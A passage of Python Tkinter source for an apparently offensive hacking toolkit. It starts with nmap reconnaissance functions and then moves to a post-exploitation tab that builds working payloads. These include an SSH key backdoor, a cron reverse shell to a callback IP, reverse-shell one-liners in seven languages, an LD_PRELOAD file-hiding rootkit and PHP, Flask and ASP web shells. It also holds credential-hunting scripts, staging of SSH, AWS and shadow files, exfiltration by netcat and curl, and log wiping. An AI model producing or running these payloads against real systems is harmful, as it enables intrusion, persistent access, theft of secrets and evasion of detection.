            messagebox.showerror("Nmap Not Found", "nmap is required for network scanning.\nInstall: sudo apt install nmap")
            return
        
        scan_type = self.recon_scan_type.get()
        ports = self.recon_ports.get()
        timing = self.recon_timing.get().split()[0]
        
        self.recon_console.insert(tk.END, f"\n[+] Starting {scan_type} scan...\n")
        self.recon_console.insert(tk.END, f"Target: {target}\n")
        self.recon_console.insert(tk.END, f"Ports: {ports}\n")
        self.recon_console.insert(tk.END, f"Timing: {timing}\n\n")
        
        # Build nmap command
        cmd = ["nmap"]
        
        # Scan type options
        if scan_type == "quick":
            cmd.extend(["-F"])  # Fast scan
        elif scan_type == "full":
            cmd.extend(["-p-"])  # All ports
        elif scan_type == "stealth":
            cmd.extend(["-sS"])  # SYN stealth scan
        elif scan_type == "service":
            cmd.extend(["-sV"])  # Version detection
        elif scan_type == "vuln":
            cmd.extend(["--script", "vuln"])
        
        # Add port specification if not full scan
        if scan_type != "full" and ports:
            cmd.extend(["-p", ports])
        
        # Timing
        cmd.append(timing)
        
        # Additional options
        if self.recon_options["os_detect"].get():
            cmd.append("-O")
        if self.recon_options["service_version"].get():
            cmd.append("-sV")
        if self.recon_options["scripts"].get():
            cmd.append("-sC")
        if self.recon_options["aggressive"].get():
            cmd.append("-A")
        if self.recon_options["traceroute"].get():
            cmd.append("--traceroute")
        if not self.recon_options["dns"].get():
            cmd.append("-n")
        
        # Output format
        cmd.extend(["-oN", "scan_results.txt"])
        cmd.append(target)
        
        self.recon_console.insert(tk.END, f"Command: {' '.join(cmd)}\n\n")
        
        # Start scan in thread
        self.recon_scan_running = True
        self.recon_scan_btn.config(text="⏳ Scanning...")
        
        threading.Thread(target=self._run_nmap_scan, args=(cmd,), daemon=True).start()
    
    def _run_nmap_scan(self, cmd):
        """Run nmap scan in background"""
        try:
            self.recon_scan_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )
            
            # Read output line by line
            for line in self.recon_scan_process.stdout:
                self.after(0, lambda l=line: self.recon_console.insert(tk.END, l))
                self.after(0, lambda: self.recon_console.see(tk.END))
                
                # Parse hosts
                if "Nmap scan report for" in line:
                    host = line.split("for")[1].strip()
                    self.after(0, lambda h=host: self._add_discovered_host(h))
                
                # Parse open ports
                if "/tcp" in line or "/udp" in line:
                    self.after(0, lambda l=line: self.recon_ports_list.insert(tk.END, l.strip()))
            
            self.recon_scan_process.wait()
            
            self.after(0, self._scan_complete)
            
        except Exception as e:
            self.after(0, lambda: self.recon_console.insert(tk.END, f"\n[ERROR] {e}\n"))
            self.after(0, self._scan_complete)
    
    def _add_discovered_host(self, host):
        """Add discovered host to list"""
        if host not in self.recon_discovered_hosts:
            self.recon_discovered_hosts.append(host)
            self.recon_hosts_list.insert(tk.END, host)
    
    def _scan_complete(self):
        """Handle scan completion"""
        self.recon_scan_running = False
        self.recon_scan_btn.config(text="🚀 Start Scan")
        self.recon_console.insert(tk.END, "\n[+] Scan complete!\n")
        self.recon_console.insert(tk.END, f"Discovered {len(self.recon_discovered_hosts)} host(s)\n")
        
        messagebox.showinfo("Scan Complete", f"Network scan finished.\nDiscovered {len(self.recon_discovered_hosts)} hosts.")
    
    def stop_network_scan(self):
        """Stop ongoing network scan"""
        if not self.recon_scan_running:
            messagebox.showwarning("No Scan", "No scan is running")
            return
        
        if self.recon_scan_process:
            self.recon_scan_process.terminate()
            self.recon_scan_process = None
        
        self.recon_scan_running = False
        self.recon_scan_btn.config(text="🚀 Start Scan")
        self.recon_console.insert(tk.END, "\n[+] Scan stopped by user\n")
    
    def network_sweep(self):
        """Quick network sweep to find live hosts"""
        target = self.recon_target.get().strip()
        if not target:
            messagebox.showwarning("No Target", "Enter target network")
            return
        
        self.recon_console.insert(tk.END, f"\n[+] Performing network sweep on {target}...\n")
        
        if shutil.which("nmap"):
            cmd = ["nmap", "-sn", "-T4", target]
            threading.Thread(target=self._run_command_output, args=(cmd,), daemon=True).start()
        else:
            self.recon_console.insert(tk.END, "nmap not found\n")
    
    def find_live_hosts(self):
        """Find live hosts using ping sweep"""
        target = self.recon_target.get().strip()
        self.recon_console.insert(tk.END, f"\n[+] Finding live hosts on {target}...\n")
        
        if shutil.which("nmap"):
            cmd = ["nmap", "-sn", "-PE", target]
            threading.Thread(target=self._run_command_output, args=(cmd,), daemon=True).start()
        else:
            self.recon_console.insert(tk.END, "nmap not found\n")
    
    def detect_firewall(self):
        """Detect firewall/IDS"""
        target = self.recon_target.get().strip()
        self.recon_console.insert(tk.END, f"\n[+] Detecting firewall on {target}...\n")
        
        if shutil.which("nmap"):
            cmd = ["nmap", "-sA", "-T4", "-p", "80,443", target]
            threading.Thread(target=self._run_command_output, args=(cmd,), daemon=True).start()
        else:
            self.recon_console.insert(tk.END, "nmap not found\n")
    
    def dns_enumeration(self):
        """DNS enumeration"""
        target = self.recon_target.get().strip()
        self.recon_console.insert(tk.END, f"\n[+] DNS enumeration for {target}...\n")
        
        if shutil.which("nslookup"):
            cmd = ["nslookup", target]
            threading.Thread(target=self._run_command_output, args=(cmd,), daemon=True).start()
        else:
            self.recon_console.insert(tk.END, "nslookup not found\n")
    
    def _run_command_output(self, cmd):
        """Run command and display output"""
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            self.after(0, lambda: self.recon_console.insert(tk.END, result.stdout))
            if result.stderr:
                self.after(0, lambda: self.recon_console.insert(tk.END, result.stderr))
            self.after(0, lambda: self.recon_console.insert(tk.END, "\n[+] Command completed\n"))
        except Exception as e:
            self.after(0, lambda: self.recon_console.insert(tk.END, f"\n[ERROR] {e}\n"))
    
    def refresh_hosts(self):
        """Refresh discovered hosts list"""
        self.recon_console.insert(tk.END, "[+] Refreshing host list...\n")
        # Re-read from scan results if available
        if os.path.exists("scan_results.txt"):
            with open("scan_results.txt", 'r') as f:
                content = f.read()
                self.recon_console.insert(tk.END, "Loaded previous scan results\n")
    
    def export_recon_results(self):
        """Export reconnaissance results"""
        filepath = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt"), ("XML", "*.xml"), ("JSON", "*.json")]
        )
        
        if filepath:
            with open(filepath, 'w') as f:
                f.write("=== Network Reconnaissance Results ===\n\n")
                f.write("Discovered Hosts:\n")
                for host in self.recon_discovered_hosts:
                    f.write(f"  {host}\n")
                f.write("\n")
                f.write(self.recon_console.get("1.0", tk.END))
            
            self.recon_console.insert(tk.END, f"[+] Results exported to {filepath}\n")
            messagebox.showinfo("Exported", f"Results saved to {filepath}")
    
    def select_host_target(self):
        """Select host from list as target"""
        selection = self.recon_hosts_list.curselection()
        if not selection:
            messagebox.showwarning("No Selection", "Select a host from the list")
            return
        
        host = self.recon_hosts_list.get(selection[0])
        self.recon_target.delete(0, tk.END)
        self.recon_target.insert(0, host)
        self.recon_console.insert(tk.END, f"[+] Target set to: {host}\n")
    
    def deep_scan_selected(self):
        """Perform deep scan on selected host"""
        selection = self.recon_hosts_list.curselection()
        if not selection:
            messagebox.showwarning("No Selection", "Select a host for deep scan")
            return
        
        host = self.recon_hosts_list.get(selection[0])
        self.recon_console.insert(tk.END, f"\n[+] Deep scanning {host}...\n")
        
        if shutil.which("nmap"):
            cmd = ["nmap", "-A", "-T4", "-p-", host]
            threading.Thread(target=self._run_command_output, args=(cmd,), daemon=True).start()
    
    def visualize_network(self):
        """Visualize network topology"""
        messagebox.showinfo("Network Visualization", 
                           "Network visualization tools:\n\n" +
                           "• zenmap - Nmap GUI with topology\n" +
                           "• netdiscover - Active/passive scanning\n" +
                           "• arp-scan - ARP-based discovery\n\n" +
                           "Install: sudo apt install zenmap")
    
    def generate_scan_report(self):
        """Generate HTML scan report"""
        if not self.recon_discovered_hosts:
            messagebox.showwarning("No Data", "Run a scan first to generate report")
            return
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        html_report = f'''<!DOCTYPE html>
<html>
<head>
    <title>Network Scan Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
        h1 {{ color: #333; }}
        .summary {{ background: white; padding: 20px; border-radius: 5px; margin: 20px 0; }}
        .host {{ background: white; padding: 15px; margin: 10px 0; border-left: 4px solid #4CAF50; }}
        pre {{ background: #f0f0f0; padding: 10px; overflow-x: auto; }}
    </style>
</head>
<body>
    <h1>Network Reconnaissance Report</h1>
    <div class="summary">
        <p><strong>Generated:</strong> {timestamp}</p>
        <p><strong>Target:</strong> {self.recon_target.get()}</p>
        <p><strong>Hosts Discovered:</strong> {len(self.recon_discovered_hosts)}</p>
    </div>
    
    <h2>Discovered Hosts</h2>
'''
        
        for host in self.recon_discovered_hosts:
            html_report += f'    <div class="host"><strong>{host}</strong></div>\n'
        
        html_report += '''    
    <h2>Scan Output</h2>
    <pre>'''
        
        html_report += self.recon_console.get("1.0", tk.END)
        html_report += '''</pre>
</body>
</html>'''
        
        filepath = filedialog.asksaveasfilename(
            defaultextension=".html",
            filetypes=[("HTML Files", "*.html")]
        )
        
        if filepath:
            with open(filepath, 'w') as f:
                f.write(html_report)
            
            self.recon_console.insert(tk.END, f"[+] Report generated: {filepath}\n")
            
            if messagebox.askyesno("Open Report", "Open report in browser?"):
                webbrowser.open(f'file://{os.path.abspath(filepath)}')
    
    def save_recon_log(self):
        """Save reconnaissance log"""
        content = self.recon_console.get("1.0", tk.END)
        
        filepath = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt")]
        )
        
        if filepath:
            with open(filepath, 'w') as f:
                f.write(content)
            self.recon_console.insert(tk.END, f"Log saved to {filepath}\n")
    
    def open_recon_tools(self):
        """Open reconnaissance tools menu"""
        tools_win = tk.Toplevel(self)
        tools_win.title("Reconnaissance Tools")
        tools_win.geometry("500x400")
        
        tk.Label(tools_win, text="Network Reconnaissance Tools", font=("Arial", 12, "bold")).pack(pady=10)
        
        tools_frame = tk.LabelFrame(tools_win, text="Available Tools", padding=15)
        tools_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        tools = [
            ("Nmap", "nmap", "Network scanner"),
            ("Masscan", "masscan", "Fast port scanner"),
            ("Netdiscover", "netdiscover", "Active/passive scanner"),
            ("arp-scan", "arp-scan", "ARP-based discovery"),
            ("Zenmap", "zenmap", "Nmap GUI"),
            ("Angry IP Scanner", "ipscan", "Cross-platform scanner"),
        ]
        
        for name, cmd, desc in tools:
            tool_frame = tk.Frame(tools_frame, relief=tk.RAISED, borderwidth=1, padding=10)
            tool_frame.pack(fill=tk.X, pady=5)
            
            tk.Label(tool_frame, text=name, font=("Arial", 10, "bold")).pack(anchor=tk.W)
            tk.Label(tool_frame, text=desc, font=("Arial", 8), foreground="#888888").pack(anchor=tk.W)
            
            status = "✓ Installed" if shutil.which(cmd) else "✗ Not installed"
            color = "#00ff00" if shutil.which(cmd) else "#ff0000"
            tk.Label(tool_frame, text=status, foreground=color).pack(anchor=tk.W)
    
    # Post-Exploitation & Persistence
    def create_postexploit_tab(self):
        """Post-exploitation tools for persistence and data exfiltration"""
        postex_frame = tk.Frame(self.notebook, padding=15)
        self.notebook.add(postex_frame, text="🔧 Post-Exploit")
        
        # Top section: Operation type
        operation_frame = tk.LabelFrame(postex_frame, text="Operation Type", padding=10)
        operation_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.postex_operation = tk.StringVar(value="persistence")
        
        operations = [
            ("persistence", "♻️ Persistence", "Maintain access"),
            ("privesc", "🔼 Privilege Escalation", "Elevate privileges"),
            ("exfiltration", "📤 Data Exfiltration", "Extract data"),
            ("lateral", "➡️ Lateral Movement", "Move to other systems"),
            ("cleanup", "🧹 Cleanup", "Remove traces"),
        ]
        
        for value, label, desc in operations:
            rb_frame = tk.Frame(operation_frame)
            rb_frame.pack(side=tk.LEFT, padx=8)
            
            tk.Radiobutton(rb_frame, text=label, variable=self.postex_operation, 
                          value=value, command=self.update_postex_options).pack(anchor=tk.W)
            tk.Label(rb_frame, text=desc, font=("Arial", 8), foreground="#888888").pack(anchor=tk.W)
        
        # Main split panel
        main_split = tk.Frame(postex_frame)
        main_split.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # Left panel: Persistence mechanisms
        left_panel = tk.Frame(main_split)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
        
        # Persistence methods
        persist_frame = tk.LabelFrame(left_panel, text="Persistence Methods", padding=10)
        persist_frame.pack(fill=tk.X, pady=(0, 10))
        
        persist_methods = [
            ("🔑 SSH Backdoor", self.create_ssh_backdoor),
            ("⏰ Cron Job", self.create_cron_persistence),
            ("🐚 Reverse Shell", self.create_reverse_shell),
            ("👁️ Rootkit", self.install_rootkit),
            ("🔐 Web Shell", self.deploy_webshell),
        ]
        
        for name, cmd in persist_methods:
            btn_frame = tk.Frame(persist_frame, style="Card.TFrame", padding=8)
            btn_frame.pack(fill=tk.X, pady=3)
            
            tk.Label(btn_frame, text=name, font=("Arial", 9, "bold")).pack(side=tk.LEFT)
            tk.Button(btn_frame, text="Create", command=cmd, width=10).pack(side=tk.RIGHT)
        
        # Configuration
        config_frame = tk.LabelFrame(left_panel, text="Configuration", padding=10)
        config_frame.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(config_frame, text="Callback IP:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.postex_callback_ip = tk.Entry(config_frame, font=("Courier", 9))
        self.postex_callback_ip.insert(0, "0.0.0.0")
        self.postex_callback_ip.grid(row=0, column=1, sticky=tk.EW, pady=5, padx=5)
        
        tk.Label(config_frame, text="Callback Port:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.postex_callback_port = tk.Entry(config_frame, font=("Courier", 9))
        self.postex_callback_port.insert(0, "4444")
        self.postex_callback_port.grid(row=1, column=1, sticky=tk.EW, pady=5, padx=5)
        
        tk.Label(config_frame, text="Interval (sec):").grid(row=2, column=0, sticky=tk.W, pady=5)
        self.postex_interval = tk.Entry(config_frame, font=("Courier", 9))
        self.postex_interval.insert(0, "60")
        self.postex_interval.grid(row=2, column=1, sticky=tk.EW, pady=5, padx=5)
        
        config_frame.columnconfigure(1, weight=1)
        
        # Data exfiltration
        exfil_frame = tk.LabelFrame(left_panel, text="Exfiltration Methods", padding=10)
        exfil_frame.pack(fill=tk.BOTH, expand=True)
        
        exfil_methods = [
            ("📧 Email", "SMTP exfiltration"),
            ("🌐 HTTP POST", "Web upload"),
            ("🔗 DNS Tunneling", "DNS-based exfil"),
            ("📊 FTP", "File transfer"),
            ("🐚 Netcat", "Raw socket transfer"),
        ]
        
        for name, desc in exfil_methods:
            method_frame = tk.Frame(exfil_frame, style="Card.TFrame", padding=6)
            method_frame.pack(fill=tk.X, pady=2)
            
            tk.Label(method_frame, text=name, font=("Arial", 8, "bold")).pack(side=tk.LEFT)
            tk.Label(method_frame, text=desc, font=("Arial", 7), foreground="#888888").pack(side=tk.LEFT, padx=10)
        
        # Right panel: Payloads & Scripts
        right_panel = tk.Frame(main_split)
        right_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Generated payload
        payload_frame = tk.LabelFrame(right_panel, text="Generated Payload", padding=10)
        payload_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        payload_toolbar = tk.Frame(payload_frame)
        payload_toolbar.pack(fill=tk.X, pady=(0, 5))
        
        tk.Button(payload_toolbar, text="💾 Save", command=self.save_postex_payload).pack(side=tk.LEFT, padx=2)
        tk.Button(payload_toolbar, text="📋 Copy", command=self.copy_postex_payload).pack(side=tk.LEFT, padx=2)
        tk.Button(payload_toolbar, text="🚀 Deploy", command=self.deploy_postex_payload).pack(side=tk.LEFT, padx=2)
        
        self.postex_payload_text = scrolledtext.ScrolledText(payload_frame, height=15, font=("Courier", 8),
                                                             bg="#1a1a1a", fg="#00ff00", wrap=tk.WORD)
        self.postex_payload_text.pack(fill=tk.BOTH, expand=True)
        
        # Quick actions
        actions_frame = tk.LabelFrame(right_panel, text="Quick Actions", padding=10)
        actions_frame.pack(fill=tk.X)
        
        actions_grid = tk.Frame(actions_frame)
        actions_grid.pack(fill=tk.X)
        
        actions = [
            ("🔍 Enum System", self.enumerate_system),
            ("🔓 Find Credentials", self.find_credentials),
            ("💾 Compress Data", self.compress_data),
            ("📤 Exfiltrate Now", self.exfiltrate_data),
            ("🧹 Clear Logs", self.clear_system_logs),
            ("🚪 Backdoor User", self.create_backdoor_user),
        ]
        
        for i, (name, cmd) in enumerate(actions):
            tk.Button(actions_grid, text=name, command=cmd, width=18).grid(row=i//2, column=i%2, padx=5, pady=3, sticky=tk.EW)
        
        actions_grid.columnconfigure(0, weight=1)
        actions_grid.columnconfigure(1, weight=1)
        
        # Bottom: Console and controls
        controls_frame = tk.Frame(postex_frame)
        controls_frame.pack(fill=tk.X, pady=(0, 10))
        
        tk.Button(controls_frame, text="🚀 Start Listener", command=self.start_listener, 
                 style="Action.TButton").pack(side=tk.LEFT, padx=5)
        tk.Button(controls_frame, text="⏹️ Stop", command=self.stop_listener).pack(side=tk.LEFT, padx=5)
        tk.Button(controls_frame, text="📊 View Sessions", command=self.view_sessions).pack(side=tk.LEFT, padx=5)
        tk.Button(controls_frame, text="🧹 Remove All", command=self.cleanup_persistence).pack(side=tk.LEFT, padx=5)
        
        # Output console
        console_frame = tk.LabelFrame(postex_frame, text="Operation Log", padding=10)
        console_frame.pack(fill=tk.BOTH, expand=True)
        
        self.postex_console = scrolledtext.ScrolledText(console_frame, height=8, bg="#0a0a0a", fg="#00ff00",
                                                        font=("Courier", 9), insertbackground="#00ff00", wrap=tk.WORD)
        self.postex_console.pack(fill=tk.BOTH, expand=True)
        
        # State
        self.postex_listener_running = False
        self.postex_listener_process = None
        
        self.postex_console.insert(tk.END, "Post-Exploitation Toolkit initialized\n")
        self.postex_console.insert(tk.END, "WARNING: Use only for authorized testing\n\n")
    
    def update_postex_options(self):
        """Update options based on operation type"""
        operation = self.postex_operation.get()
        self.postex_console.insert(tk.END, f"Operation mode: {operation}\n")
    
    def create_ssh_backdoor(self):
        """Create SSH backdoor"""
        self.postex_console.insert(tk.END, "\n[+] Generating SSH backdoor...\n")
        
        payload = '''#!/bin/bash
# SSH Backdoor - Authorized Keys Injection

# Generate SSH key pair
SSH_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... backdoor@attacker"

# Add to authorized_keys
echo "$SSH_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Alternative: Add to root
sudo mkdir -p /root/.ssh
sudo bash -c "echo '$SSH_KEY' >> /root/.ssh/authorized_keys"
sudo chmod 600 /root/.ssh/authorized_keys

echo "[+] SSH backdoor installed"
'''
        
        self.postex_payload_text.delete("1.0", tk.END)
        self.postex_payload_text.insert("1.0", payload)
        self.postex_console.insert(tk.END, "[+] SSH backdoor script generated\n")
    
    def create_cron_persistence(self):
        """Create cron-based persistence"""
        callback_ip = self.postex_callback_ip.get()
        callback_port = self.postex_callback_port.get()
        interval = self.postex_interval.get()
        
        self.postex_console.insert(tk.END, "\n[+] Creating cron persistence...\n")
        
        payload = f'''#!/bin/bash
# Cron Persistence Mechanism

# Reverse shell callback
REVERSE_SHELL="bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1"

# Add to crontab (every {interval} seconds via minute intervals)
CRON_JOB="*/{int(interval)//60 if int(interval) >= 60 else 1} * * * * $REVERSE_SHELL"

# Install cron job
(crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -

# Alternative: System-wide cron
echo "$CRON_JOB" | sudo tee /etc/cron.d/system-update > /dev/null

echo "[+] Cron persistence installed"
echo "[+] Callbacks every {interval} seconds to {callback_ip}:{callback_port}"
'''
        
        self.postex_payload_text.delete("1.0", tk.END)
        self.postex_payload_text.insert("1.0", payload)
        self.postex_console.insert(tk.END, f"[+] Cron persistence for {callback_ip}:{callback_port}\n")
    
    def create_reverse_shell(self):
        """Create reverse shell payload"""
        callback_ip = self.postex_callback_ip.get()
        callback_port = self.postex_callback_port.get()
        
        self.postex_console.insert(tk.END, "\n[+] Generating reverse shell payloads...\n")
        
        payload = f'''# Reverse Shell Payloads
# Listener: nc -lvnp {callback_port}

# Bash
bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{callback_ip}",{callback_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat
nc {callback_ip} {callback_port} -e /bin/bash

# Perl
perl -e 'use Socket;$i="{callback_ip}";$p={callback_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'

# PHP
php -r '$sock=fsockopen("{callback_ip}",{callback_port});exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("{callback_ip}",{callback_port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# PowerShell (Windows)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{callback_ip}',{callback_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
'''
        
        self.postex_payload_text.delete("1.0", tk.END)
        self.postex_payload_text.insert("1.0", payload)
        self.postex_console.insert(tk.END, f"[+] Reverse shells for {callback_ip}:{callback_port}\n")
    
    def install_rootkit(self):
        """Generate rootkit installer"""
        self.postex_console.insert(tk.END, "\n[+] Rootkit installer (educational)...\n")
        
        payload = '''#!/bin/bash
# Rootkit Installation Framework (Educational)

# WARNING: For authorized testing only

echo "[+] Installing rootkit components..."

# LD_PRELOAD based rootkit
cat > /tmp/rootkit.c << 'EOF'
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>

// Hook readdir to hide files
struct dirent *readdir(DIR *dirp) {
    struct dirent *(*original_readdir)(DIR*) = dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;
    
    while ((entry = original_readdir(dirp)) != NULL) {
        if (strstr(entry->d_name, "backdoor") == NULL) {
            return entry;
        }
    }
    return NULL;
}
EOF

# Compile
gcc -shared -fPIC /tmp/rootkit.c -o /tmp/rootkit.so -ldl

# Install
sudo cp /tmp/rootkit.so /usr/lib/rootkit.so
echo "/usr/lib/rootkit.so" | sudo tee -a /etc/ld.so.preload

echo "[+] Rootkit installed (LD_PRELOAD)"
echo "[!] Remove with: sudo sed -i '/rootkit/d' /etc/ld.so.preload"
'''
        
        self.postex_payload_text.delete("1.0", tk.END)
        self.postex_payload_text.insert("1.0", payload)
        self.postex_console.insert(tk.END, "[+] Rootkit installer generated\n")
        self.postex_console.insert(tk.END, "[!] Requires root privileges\n")
    
    def deploy_webshell(self):
        """Deploy web shell"""
        self.postex_console.insert(tk.END, "\n[+] Generating web shells...\n")
        
        payload = '''<!-- PHP Web Shell -->
<?php
if(isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<!-- Usage: shell.php?cmd=whoami -->

<!-- Python (Flask) Web Shell -->
# python_shell.py
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/')
def shell():
    cmd = request.args.get('cmd', '')
    if cmd:
        result = subprocess.check_output(cmd, shell=True, text=True)
        return f"<pre>{result}</pre>"
    return "Web Shell Active"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

<!-- ASP.NET Web Shell -->
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    string cmd = Request["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
'''
        
        self.postex_payload_text.delete("1.0", tk.END)
        self.postex_payload_text.insert("1.0", payload)
        self.postex_console.insert(tk.END, "[+] Web shells generated (PHP, Python, ASP)\n")
    
    def enumerate_system(self):
        """System enumeration script"""
        self.postex_console.insert(tk.END, "\n[+] Generating enumeration script...\n")
        
        payload = '''#!/bin/bash
# System Enumeration Script

echo "=== SYSTEM ENUMERATION ==="

echo "\n[+] System Information:"
uname -a
cat /etc/*release

echo "\n[+] Current User:"
whoami
id

echo "\n[+] Users:"
cat /etc/passwd

echo "\n[+] Sudo Privileges:"
sudo -l

echo "\n[+] SUID Binaries:"
find / -perm -4000 -type f 2>/dev/null

echo "\n[+] Writable Directories:"
find / -writable -type d 2>/dev/null | head -20

echo "\n[+] Network Connections:"
netstat -tulpn
ss -tulpn

echo "\n[+] Running Processes:"
ps aux

echo "\n[+] Cron Jobs:"
crontab -l
ls -la /etc/cron*

echo "\n[+] Environment Variables:"
env

echo "\n[+] Installed Software:"
dpkg -l 2>/dev/null || rpm -qa 2>/dev/null
'''
        
        self.postex_payload_text.delete("1.0", tk.END)
        self.postex_payload_text.insert("1.0", payload)
        self.postex_console.insert(tk.END, "[+] Enumeration script ready\n")
    
    def find_credentials(self):
        """Find credentials on system"""
        self.postex_console.insert(tk.END, "\n[+] Generating credential hunting script...\n")
        
        payload = '''#!/bin/bash
# Credential Hunting Script

echo "=== CREDENTIAL HUNTING ==="

echo "\n[+] SSH Keys:"
find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null
cat ~/.ssh/id_rsa 2>/dev/null

echo "\n[+] History Files:"
cat ~/.bash_history 2>/dev/null | grep -i "password\\|pass\\|pwd\\|token\\|key"
cat ~/.zsh_history 2>/dev/null | grep -i "password\\|pass\\|pwd\\|token\\|key"

echo "\n[+] Configuration Files:"
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password" 2>/dev/null

echo "\n[+] Database Files:"
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null

echo "\n[+] Passwords in Files:"
grep -r "password" /var/www/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null | head -20

echo "\n[+] Environment Variables:"
env | grep -i "password\\|key\\|token\\|secret"

echo "\n[+] Docker Secrets:"
find / -path "*/docker/*" -name "*.env" 2>/dev/null
'''
        
        self.postex_payload_text.delete("1.0", tk.END)
        self.postex_payload_text.insert("1.0", payload)
        self.postex_console.insert(tk.END, "[+] Credential hunting script ready\n")
    
    def compress_data(self):
        """Compress data for exfiltration"""
        self.postex_console.insert(tk.END, "\n[+] Compressing data...\n")
        
        payload = '''#!/bin/bash
# Data Compression & Staging

OUTPUT="/tmp/.system_backup_$(date +%s).tar.gz"

# Collect interesting files
tar czf $OUTPUT \
    ~/Documents \
    ~/.ssh \
    ~/.aws \
    ~/.docker \
    /etc/passwd \
    /etc/shadow 2>/dev/null

echo "[+] Data compressed: $OUTPUT"
ls -lh $OUTPUT
'''
        
        self.postex_payload_text.delete("1.0", tk.END)
        self.postex_payload_text.insert("1.0", payload)
        self.postex_console.insert(tk.END, "[+] Compression script ready\n")
    
    def exfiltrate_data(self):
        """Exfiltrate compressed data"""
        callback_ip = self.postex_callback_ip.get()
        callback_port = self.postex_callback_port.get()
        
        self.postex_console.insert(tk.END, "\n[+] Generating exfiltration script...\n")
        
        payload = f'''#!/bin/bash
# Data Exfiltration

DATA_FILE="/tmp/.system_backup_*.tar.gz"
SERVER="{callback_ip}"
PORT="{callback_port}"

echo "[+] Exfiltrating data..."

# Method 1: Netcat
cat $DATA_FILE | nc $SERVER $PORT

# Method 2: HTTP POST
curl -X POST -F "file=@$DATA_FILE" http://$SERVER:$PORT/upload

# Method 3: Base64 via DNS (covert)
# for chunk in $(cat $DATA_FILE | base64 | fold -w 63); do
#     dig $chunk.$SERVER
# done

# Method 4: ICMP tunneling
# xxd -p -c 16 $DATA_FILE | while read line; do
#     ping -c 1 -p $line $SERVER
# done

echo "[+] Exfiltration complete"
'''
        
        self.postex_payload_text.delete("1.0", tk.END)
        self.postex_payload_text.insert("1.0", payload)
        self.postex_console.insert(tk.END, f"[+] Exfiltration to {callback_ip}:{callback_port}\n")
    
    def clear_system_logs(self):
        """Clear system logs"""
        self.postex_console.insert(tk.END, "\n[+] Generating log cleanup script...\n")
        
        payload = '''#!/bin/bash
# Log Cleanup & Anti-Forensics

echo "[+] Clearing logs..."

# Clear auth logs
sudo truncate -s 0 /var/log/auth.log
sudo truncate -s 0 /var/log/auth.log.*

# Clear syslog
sudo truncate -s 0 /var/log/syslog
sudo truncate -s 0 /var/log/syslog.*

# Clear command history
cat /dev/null > ~/.bash_history
cat /dev/null > ~/.zsh_history
history -c

# Clear last login
sudo truncate -s 0 /var/log/wtmp
sudo truncate -s 0 /var/log/btmp
sudo truncate -s 0 /var/log/lastlog

# Clear user-specific logs
rm -f ~/.lesshst
rm -f ~/.viminfo

# Disable history (current session)
unset HISTFILE

echo "[+] Logs cleared"
'''
        
        self.postex_payload_text.delete("1.0", tk.END)
        self.postex_payload_text.insert("1.0", payload)
        self.postex_console.insert(tk.END, "[+] Log cleanup script generated\n")
    
    def create_backdoor_user(self):
